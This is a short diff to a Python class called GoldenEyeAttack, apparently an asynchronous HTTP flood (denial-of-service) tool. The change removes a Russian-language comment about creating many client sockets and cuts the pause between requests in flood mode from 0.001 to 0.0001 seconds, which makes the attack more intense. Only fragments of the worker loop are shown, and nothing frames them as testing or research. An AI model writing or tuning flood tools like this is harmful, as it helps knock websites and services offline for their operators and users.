@@ -74,7 +74,6 @@ class GoldenEyeAttack:
             pass
 
     async def worker(self, base_kwargs):
-        # Создаем N клиентов (сокетов)
         clients = []
         try:
             for _ in range(self.sockets):
@@ -116,7 +115,7 @@ class GoldenEyeAttack:
                     self.active_tasks.add(task)
                     task.add_done_callback(lambda t: self.active_tasks.discard(t))
 
-                await asyncio.sleep(0.001 if self.flood else random.uniform(0.01, 0.1))
+                await asyncio.sleep(0.0001 if self.flood else random.uniform(0.01, 0.1))
 
         finally:
             for client in clients:
